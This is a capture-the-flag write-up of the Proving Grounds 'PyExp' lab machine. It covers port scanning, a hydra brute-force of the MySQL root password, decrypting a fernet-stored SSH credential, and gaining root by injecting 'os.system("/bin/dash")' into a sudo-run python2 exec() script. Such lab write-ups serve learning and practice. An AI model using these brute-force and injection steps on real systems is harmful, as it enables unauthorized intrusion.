---
title: "Proving grounds Play: PyExp"
layout: post
date: 2023-09-17 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7af6cd12694dce51a221a644e1c34a9 (RSA)
|   256 46d28dbd2f9eafcee2455ca612c0d919 (ECDSA)
|_  256 8d11edff7dc5a72499227fce2988b24a (ED25519)
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1
|   Thread ID: 368
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsCompression, InteractiveClient, SupportsLoadDataLocal, Speaks41ProtocolNew, LongColumnFlag, FoundRows, ODBCClient, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: KyD%+GeFklYZ8G;3,#he
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Brute Force mysql credentials

```sh
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.204.118
```

Credentials obtained `root:prettywoman`.

![img](/assets/images/CTF/Proving_Grounds/PyExp/mysql.png)

Select database `data` and check the tables.

```sh
MariaDB [(none)]> use data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| fernet         |
+----------------+
1 row in set (0.215 sec)
```

Extract data from the table `fernet`.

```sh
MariaDB [data]> SELECT * from fernet;
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
1 row in set (0.182 sec)

MariaDB [data]>
```

## Fernet Decode

![img](/assets/images/CTF/Proving_Grounds/PyExp/fernet.png)

### Decoded data

```text
Decoded:	lucy:wJ9`"Lemdv9[FEw-
Date created:	Mon Aug 10 21:02:44 2020
Current time:	Sun Sep 17 03:36:04 2023

======Analysis====
Decoded data:  80000000005f31b5f46ea5894d37472946181bd53963a2460a980488baa6608565581eedf20becb9ac9f84b38efdc1e7250175fe26efd78b22d4c6cbec382df4e764f262870172e1c8766995ac74bf4d8c33387fcff788ef2b
Version:	80
Date created:	000000005f31b5f4
IV:		6ea5894d37472946181bd53963a2460a
Cipher:		980488baa6608565581eedf20becb9ac9f84b38efdc1e7250175fe26efd78b22
HMAC:		d4c6cbec382df4e764f262870172e1c8766995ac74bf4d8c33387fcff788ef2b

======Converted====
IV:		6ea5894d37472946181bd53963a2460a
Time stamp:	1597093364
Date created:	Mon Aug 10 21:02:44 2020
```

Decoded data is a SSH credential.

SSH to user `lucy` using the password obtained in the above step.

**Initial Foothold Obtained**

## Privilege Escalation

Check permissions for the user.

![img](/assets/images/CTF/Proving_Grounds/PyExp/shell.png)

The user can run python2 as root without password and check the python code.

```py
uinput = raw_input('how are you?')
exec(uinput)
```

The input `uinput` in the above code is not sanitized, so an arbitrary command injection vulnerability is exploitable.

Run the python code as super user as below with the input as a OS command.

```sh
import os; os.system("/bin/dash")
```

![img](/assets/images/CTF/Proving_Grounds/PyExp/root.png)

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).